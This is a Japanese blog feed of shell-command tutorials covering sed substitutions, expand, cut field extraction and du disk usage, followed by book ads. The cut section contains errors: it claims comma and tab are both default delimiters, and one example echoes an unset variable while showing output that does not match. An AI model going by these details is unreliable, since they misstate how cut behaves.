echoコマンドから入力を受け取り、テキスト内の「Python」という単語を検索します。単語がテキストに存在する場合、新しいテキスト「Added Text」が改行で挿入されます。\n$ echo \u0026#34;Bash Perl Python Java PHP ASP\u0026#34; | sed \u0026#39;s/Python/Added Text\\n/\u0026#39; Bash Perl Added Text Java PHP ASP ファイルから改行を削除し各行の最後にコンマを挿入 次のsedコマンドは、ファイルos.txtの各改行をコンマに置き換えます。ここで、-zオプションは、行をNULL文字で区切るために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed -z \u0026#39;s/\\n/,/g\u0026#39; Windows,Linux,Android,OS,$ カンマを削除し、改行を追加して、テキストを複数の行に分割 次のsedコマンドは、echoコマンドからコンマで区切られた行を入力として受け取り、コンマを改行に置き換えます。\n$ echo \u0026#34;Kaniz Fatema,30th,batch\u0026#34; | sed \u0026#34;s/,/\\n/g\u0026#34; Kaniz Fatema 30th batch ヒント 上記のコマンドを実行すると、入力テキストのカンマは改行に置き換えられ3行で印刷されます。 大文字と小文字を区別しない一致を検索し、行を削除 次のsedコマンド\u0026rsquo;I\u0026rsquo;は、大文字と小文字を区別しないオプションです。一致で大文字と小文字を無視することを示します。\n次のsedコマンドは、「linux」という単語を大文字小文字を区別せずに検索し、 os.txtファイルからその行を削除します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/linux/Id\u0026#39; Windows Android OS 大文字と小文字を区別しない一致を見つけて、新しいテキストに置き換える 次のsedコマンドは、echoコマンドからの入力を受け取り、単語\u0026rsquo;bash\u0026rsquo;を単語\u0026rsquo;PHP\u0026rsquo;に置き換えます。\n「Bash」という単語は、大文字と小文字を区別しない検索のために「bash」という単語と一致し、「PHP」という単語に置き換えられています。\n$ echo \u0026#34;I like bash programming \u0026#34; | sed \u0026#39;s/Bash/PHP/i\u0026#39; I like PHP programming 大文字と小文字を区別しない一致を見つけて、同じテキストのすべて大文字に置き換える \u0026lsquo;\\U\u0026rsquo;は、テキストをすべて大文字に変換します。次のsedコマンドは、 os.txtファイル内の単語\u0026rsquo;linux\u0026rsquo;を大文字小文字を区別せずに検索し、単語が存在する場合は、単語をすべて大文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;s/\\(linux\\)/\\U\\1/Ig\u0026#39; Windows LINUX Android OS 大文字と小文字を区別しない一致を見つけて、同じテキストのすべての小文字に置き換える \u0026lsquo;\\L\u0026rsquo;はsedで使用され、テキストをすべて小文字に変換します。次のsedコマンドは、os.txtファイルの「Linux」という単語を検索し、その単語をすべて小文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;s/\\(linux\\)/\\L\\1/Ig\u0026#39; Windows linux Android OS テキスト内のすべての大文字を小文字に置き換える 次のsedコマンドは、os.txtファイル内のすべての大文字を検索し、「\\L」を使用して文字を小文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/\\(.*\\)/\\L\\1/\u0026#39; windows linux android os 行の番号を検索し、番号の後に通貨記号を追加 以下のファイルを準備します。\nHDD 100 Monitor 80 Mouse 10 実行結果は以下の通りです。\n$ cat items.txt HDD 100 Monitor 80 Mouse 10 $ $ cat items.txt | sed \u0026#39;s/\\([0-9]\\)/$\\1/\u0026#39; HDD $100 Monitor $80 Mouse $10 上記のコマンドを実行すると、次の出力が表示されます。ここでは、各行の番号の前に「$」記号が追加されています。\n3桁を超える数値にコンマを追加 次のsedコマンドは、 echoコマンドからの入力として数値を受け取り、右から数えて3桁の各グループの後にコンマを追加します。ここで、「：a」はラベルを示し、「ta」はグループ化プロセスを繰り返すために使用されます。\n$ echo \u0026#34;5098673\u0026#34; | sed -e :a -e \u0026#39;s/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta\u0026#39; 5,098,673 ヒント ようするに桁区切りをsedコマンドで実現するということです。 タブ文字を4つのスペース文字に置き換えます 次のsedコマンドは、各タブ（\\ t）文字を4つのスペース文字に置き換えます。「$」記号は「sed」コマンドでタブ文字と一致するように使用され、「g」はすべてのタブ文字を置き換えるために使用されます。\n実行結果は以下のとおりです。\\tという文字列が\n$ echo -e \u0026#34;1\\t2\\t3\u0026#34; | sed $\u0026#39;s/\\t/ /g\u0026#39; 1 2 3 4つの連続するスペース文字をタブ文字に置き換えます 次のコマンドは、4つの連続する文字をタブ（\\ t）文字に置き換えます。\n$ echo -e \u0026#34;1 2\u0026#34; | sed $\u0026#39;s/ /\\t/g\u0026#39; 1\t2 すべての行を最初の80文字に切り捨てます この例をテストするには、80文字を超える行を含むin.txtという名前のテキストファイルを作成します。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ cat in.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive.PHP is platform-independent. $ $ cat in.txt | sed \u0026#39;s/\\(^.\\{1,80\\}\\).*/\\1/\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive.PHP is platform-indepen ヒント 上記のコマンドを実行すると、次の出力が表示されます。in.txtファイルの2行目には、80文字を超える文字が含まれており、この行は出力で切り捨てられます。 文字列の正規表現を検索し、その後に標準テキストを追加 次のsedコマンドは、入力テキスト内のテキスト\u0026rsquo; hello \u0026lsquo;を検索し、そのテキストの後にテキスト\u0026rsquo; John \u0026lsquo;を追加します。\n実行結果は以下のとおりです。\n$ echo \u0026#34;hello, how are you?\u0026#34; | sed \u0026#39;s/\\(hello\\)/\\1 John/\u0026#39; hello John, how are you? 文字列の正規表現と、その後に見つかった文字列の2番目のコピーを検索します 次のsedコマンドは、 input.txtの各行のテキスト「 PHP 」を検索し、各行の2番目の一致をテキスト「NewTextAdded」に置き換えます。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\n$ cat input.txt | sed \u0026#39;s/\\(PHP\\)/\\1 (New Text added)/2\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP (New Text added) is case-sensitive. PHP is platform-independent. ヒント 上記のコマンドを実行すると、次の出力が表示されます。検索テキスト「PHP 」は、 input.txtファイルの2行目と3行目に2回表示されます。そのため、2行目と3行目に「NewTextadded」というテキストが挿入されます。 ファイルからの複数行のsedスクリプトの実行 複数のsedスクリプトをファイルに保存し、sedコマンドを実行することですべてのスクリプトを一緒に実行できます。\u0026lsquo;sedcmd \u0026lsquo;という名前のファイルを作成し、次のコンテンツを追加します。ここでは、2つのsedスクリプトがファイルに追加されています。1つのスクリプトがテキスト「PHP」を「ASP」に置き換えます。別のスクリプトがテキスト「独立」をテキスト「依存」に置き換えます。\ns/PHP/ASP/ s/independent/dependent/ PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\n$ cat sedcmd s/PHP/ASP/ s/independent/dependent/ $ $ cat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ $ cat input.txt | sed -f sedcmd ASP is a server-side scripting language. ASP is an open-source language and PHP is case-sensitive. ASP is platform-dependent. ヒント 同様の検索ルールを別ファイルにしておくことで、何度も同じルールを書くことをしなくてすみます。必要なときにファイルを読み出せばよいわけです。 複数行のパターンに一致し、新しい複数行のテキストに置き換える 次のsedコマンドは、複数行のテキスト\u0026rsquo;Linux \\ nAndroid\u0026rsquo;を検索し、パターンが一致する場合、一致する行は複数行のテキスト\u0026rsquo; Ubuntu \\nAndroidLollipop\u0026rsquo;に置き換えられます。ここで、PとDはマルチライン処理に使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;$!N;s/Linux\\nAndroid/Ubuntu\\nAndoid Lollipop/;P;D\u0026#39; Windows Ubuntu Andoid Lollipop OS ヒント わけがわかりませんね。http://blog.livedoor.jp/morituri/archives/52036613.html　こちらを参考に。検索文字列は「sed Nコマンド」です。 パターンに一致する2つの単語の順序を置き換えます 次のsedコマンドは、 echoコマンドから2つの単語の入力を受け取り、これらの単語の順序を置き換えます。\n実行結果は以下のとおりです。\n$ echo \u0026#34;perl python\u0026#34; | sed -e \u0026#39;s/\\([^ ]*\\) *\\([^ ]*\\)/\\2 \\1/\u0026#39; python perl コマンドラインから複数のsedコマンドを使用する \u0026lsquo;-e\u0026rsquo;オプションは、コマンドラインから複数のsedスクリプトを実行するためにsedコマンドで使用されます。次のsedコマンドは、 echoコマンドからの入力としてテキストを受け取り、「Ubuntu」を「Kubuntu」に、「Centos」を「Fedora」に置き換えます。\n実行結果は以下のとおりです。\n$ echo \u0026#34;Ubuntu Centos Debian\u0026#34; | sed -e \u0026#39;s/Ubuntu/Kubuntu/; s/Centos/Fedora/\u0026#39; Kubuntu Fedora Debian sedを他のコマンドと組み合わせる 次のコマンドは、sedコマンドとcatコマンドを組み合わせたものです。最初のsedコマンドはos.txtファイルから入力を受け取り、テキスト\u0026rsquo;\u0026lsquo;Linux\u0026rsquo;を\u0026rsquo;Fedora\u0026rsquo;に置き換えた後、コマンドの出力を2番目のsedコマンドに送信します。2番目のsedコマンドは、テキスト「Windows」を「Windows10」に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/Linux/Fedora/\u0026#39;| sed \u0026#39;s/windows/Windows 10/i\u0026#39; Windows 10 Fedora Android OS ヒント sedの連結は以下のように書くことができます。 $ cat os.txt | sed -e \u0026#39;s/Linux/Fedora/\u0026#39; -e \u0026#39;s/windows/Windows 10/i\u0026#39; Windows 10 Fedora Android OS bash-5.1$ ヒント sed -e と書くことで、パイプで渡すことなく、sedコマンドを連続して使うことができます。 ファイルに空の行を挿入 次の内容のstdlist.txtを作成します。\n#ID #Name [ 101 ] -Ali [ 102 ] -Neha 「G」オプションは、ファイルに空の行を挿入するために使用されます。次のsedコマンドは、 stdlistファイルの各行の後に空の行を挿入します。\n実行結果は以下のとおりです。\n$ cat stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha $ $ sed G stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha ヒント 一見、使われそうなGオプションですが、使うシチュエーションに出会ったことがありません。 ファイルの各行からすべての英数字を削除 次のコマンドは、 stdlistファイル内のすべての英数字をスペースに置き換えます。\n#ID #Name [ 101 ] -Ali [ 102 ] -Neha 実行結果は以下のとおりです。\n$ cat stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha $ $ cat stdlist.txt | sed \u0026#39;s/[A-Za-z0-9]//g\u0026#39; # # [ ] - [ ] - $ 「\u0026amp;」を使用して文字列と一致させる 次のコマンドは、「L」で始まる単語を検索し、「Matched String is –」を「\u0026amp;」記号を使用して一致した単語に追加することでテキストを置き換えます。ここで、「p」は変更されたテキストを印刷するために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed -n \u0026#39;s/^L/Matched String is - \u0026amp;/p\u0026#39; Matched String is - Linux 単語のペアを切り替える 各行に単語のペアを含む次のコンテンツを含むcourse.txtという名前のテキストファイルを作成します。\nPHP ASP MySQL Oracle CodeIgniter Laravel 実行結果は以下のとおりです。\n$ cat course.txt PHP ASP MySQL Oracle CodeIgniter Laravel $ $ cat course.txt | sed \u0026#39;s/\\([^ ]*\\) *\\([^ ]*\\)/\\2 \\1/\u0026#39; ASP PHP Oracle MySQL Laravel CodeIgniter $ 各単語の最初の文字を大文字に変換する 次のsedコマンドは、 echoコマンドから入力テキストを受け取り、各単語の最初の文字を大文字に変換します。\n$ echo \u0026#34;I like bash programming\u0026#34; | sed \u0026#39;s/\\([a-z]\\)\\([a-zA-Z0-9]*\\)/\\u\\1\\2/g\u0026#39; I Like Bash Programming ヒント ここまでくると、カルト級ですね。使いこなせる人がいればほぼ神業ですね。 ファイルの行番号を印刷する \u0026lsquo;=\u0026lsquo;記号は、ファイルの各行の前に行番号を出力するためにsedコマンドで使用されます。次のコマンドは、os.txtファイルの内容を行番号とともに出力します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt |sed \u0026#39;=\u0026#39; 1 Windows 2 Linux 3 Android 4 OS ヒント できれば行頭に行番号が来てほしいですね。工夫して頑張って作ってみてください。 $ cat os.txt | sed \u0026#39;=\u0026#39; | sed \u0026#39;N;s/\\n/ /\u0026#39; ヒント 楽しめましたか？では 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-14T15:00:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-14-01-sed-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-14-01-sed-suzuki/","title":"（１８）【sed】シェルスクリプトコマンド活用紹介"},{"content":"expandコマンド タブを空白に変換する（expandコマンド） タブの幅を指定する expandコマンド概要 「expand」はタブを空白に変換するコマンド、「unexpand」は空白をタブに変換するコマンドです。デフォルトのタブ幅は8桁で、これを変更したい場合は「-t」オプションでタブの文字数を指定します。\nexpandコマンドの書式 expand [オプション] [ファイル]\nunexpand [オプション] [ファイル]\nexpandコマンドの主なオプション オプション 意味 -t 文字数 タブの文字数またはタブ位置のリストを指定する expandコマンド詳細説明 タブを空白に変換する まずサンプルファイルを用意します。\n$ echo -e \u0026#34;No-1\\tTokyo\\t1354098\\nNo-2\\tOsaka\\t934765\\nNo-3\\tNagoya\\t786592\u0026#34; \u0026gt; ex.txt $ cat ex.txt No-1\tTokyo\t1354098 No-2\tOsaka\t934765 No-3\tNagoya\t786592 expandコマンドでタブを空白に変換します。\n$ expand ex.txt \u0026gt; ex2.txt $ cat ex2.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 見た目は全く変わりませんが、タブが空白に置き換えられました。\nデフォルトのタブ幅は８です。\nタブの幅を指定する タブ幅を変更する場合は、「-t」オプションを使用します。例えば、12文字の幅にしたい場合は「-t 12」と指定します。\n# サンプルファイルを作成 $ echo -e \u0026#34;No-1\\tTokyo\\t1354098\\nNo-2\\tOsaka\\t934765\\nNo-3\\tNagoya\\t786592\u0026#34; \u0026gt; ex.txt $ cat ex.txt No-1\tTokyo\t1354098 No-2\tOsaka\t934765 No-3\tNagoya\t786592 # タブ幅のデフォルトは8です。 $ expand ex.txt \u0026gt; ex2.txt $ cat ex2.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 # タブ幅を10に指定 $ expand -t 10 ex.txt \u0026gt;ex3.txt $ cat ex3.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 ヒント タブ幅を変更する場合には、$ expand -t 10 と、覚えておけば良いと思います。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-14T13:19:26+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-14-01-expand-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-14-01-expand-suzuki/","title":"（１７）【expand】シェルスクリプトコマンド活用紹介"},{"content":"cutコマンド 文字数を指定して切り出す フィールドを指定して切り出す 出力の区切り文字を変更する cutコマンド概要 「cut」は、ファイルを読み込んで、それぞれの行から指定した部分だけを切り出すコマンドです。例えば、「3文字目から10文字目」や、タブなどで区切られたファイルから「1番目のフィールドと3番目のフィールド」のように選んで取り出すことができます。\ncutコマンドの書式 cut オプション [ファイル]\ncutコマンドの主なオプション オプション 意味 -c 切り出す位置のリストを文字数で指定する -f 1,3または1-3 切り出す位置のリストをタブ区切りのフィールドで指定する（区切り文字は「-d」オプションで変更可能） -d \u0026lsquo;文字\u0026rsquo; フィールドの区切り文字として、タブの代わりに使用する文字を指定する（1文字のみ） cutコマンド詳細説明 文字数を指定して切り出す cutコマンドで頭から4文字を切り出す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo $string | cut -c 1-4 Hell bashの文字列変数で頭から4文字を切す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo ${STR:0:4} Hell sedコマンドで先頭から4文字切り出す\n$ STR=\u0026#34;Hello World\u0026#34; $ echo \u0026#34;${STR}\u0026#34; | sed \u0026#39;s/^\\(.\\{4\\}\\).*$/\\1/\u0026#39; Hell フィールドを指定して切り出す フィールドの区切り文字は、デフォルトで ,(カンマ）とTAB(タブ）です。\n特に指定しなければ、cutコマンドが考えて区切り文字として認識してくれます。\nただカンマとTABが混在している場合は不安ですね。\n次の項で、区切り文字（デリミタ）を指定する方法を説明します。\n区切り文字のデフォルトがカンマとタブだから\n/etc/passwdのようにデリミタを指定しないときちんと区切られない。\n$ sudo cat /etc/passwd | cut -f 1,7 | tail _findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false _datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false _captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false _ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false _applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false _hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false _cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false _analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false _fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false _timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false デリミタを指定した場合はきちんと１番目、７番目のフィールドが切り取られました\nまずはcutコマンドで実現します。\n$ sudo cat /etc/passwd | cut -f 1,7 -d \u0026#39;:\u0026#39; | tail _findmydevice:/usr/bin/false _datadetectors:/usr/bin/false _captiveagent:/usr/bin/false _ctkd:/usr/bin/false _applepay:/usr/bin/false _hidd:/usr/bin/false _cmiodalassistants:/usr/bin/false _analyticsd:/usr/bin/false _fpsd:/usr/bin/false _timed:/usr/bin/false $ 同じことをawkコマンドでやってみます。デリミタの区切り指定は -F です。\n$ sudo cat /etc/passwd | awk -F \u0026#39;:\u0026#39; \u0026#39;{ print $1\u0026#34;:\u0026#34;$7;}\u0026#39; | tail _findmydevice:/usr/bin/false _datadetectors:/usr/bin/false _captiveagent:/usr/bin/false _ctkd:/usr/bin/false _applepay:/usr/bin/false _hidd:/usr/bin/false _cmiodalassistants:/usr/bin/false _analyticsd:/usr/bin/false _fpsd:/usr/bin/false _timed:/usr/bin/false $ ヒント 文字を切り出す方法にもいくつかありますし、フィールドの切り出しにもいろいろな方法があります。用途に合わせて使い分けてください。最初のうちは、一つの方法を覚えておけばよいです。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-14T11:19:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-14-01-cut-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-14-01-cut-suzuki/","title":"（１６）【cut】シェルスクリプトコマンド活用紹介"},{"content":"duコマンド ディレクトリごとのディスク使用量を表示する ディスク使用量の合計だけを表示する カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する duコマンド概要 「du」は、ディスクの使用量をディレクトリごとに集計して表示するコマンドです。ファイルを指定した場合は指定したファイルのサイズのみ、ディレクトリを指定した場合はそのディレクトリおよび全てのサブディレクトリの使用量を集計します。対象を指定しなかった場合は、カレントディレクトリの使用量が表示されます。\nヒント duコマンドで最も使われるオプションは -h -s です。この組み合わせだけを覚えていれば大丈夫です。 duコマンドの書式 du [オプション] [ファイルまたはディレクトリ]\nduコマンドの主なオプション オプション 意味 -h サイズに応じて読みやすい単位で表示する -s 指定したディレクトリの合計のみを表示する duコマンド詳細説明 ディレクトリごとのディスク使用量を表示する $ du -h : : ＜どばーっとでてきます＞ : : ヒント あまりにもたくさん表示されて、なにがなんだかわかりませんね。大丈夫です。次の項で -s オプションを紹介します。 ディスク使用量の合計だけを表示する 指定したディレクトリの合計容量だけを表示したい場合は、「-s」オプションを使用します。\ndu -s で、カレントディレクトリが使用している容量が表示されます。\n$ du -h -s 1.4G\t. カレントディレクトリ直下のファイル、ディレクトリごとの集計を表示する カレントディレクトリ直下のファイル、またはディレクトリごとの集計値を表示するには、アスタリスク * をつけます。\ndu -h -s * で、カレントディレクトリ直下のファイルおよびディレクトリごとの集計となります。\n$ du -h -s * 72K\tAI_Algorithm_Game_Bash 440K\tAI_Algorithm_Game_Chess 276M\tAI_Algorithm_Game_Othello 971M\tAI_Algorithm_Game_RubiksCube 157M\tAI_Algorithm_Game_Shogi ヒント duコマンドはディレクトリ以下の使用量を表示するコマンドです。dfコマンド同様 -h でサイズが見やすく表示されます。 -s でカレントディレクトリの使用量が表示され、* 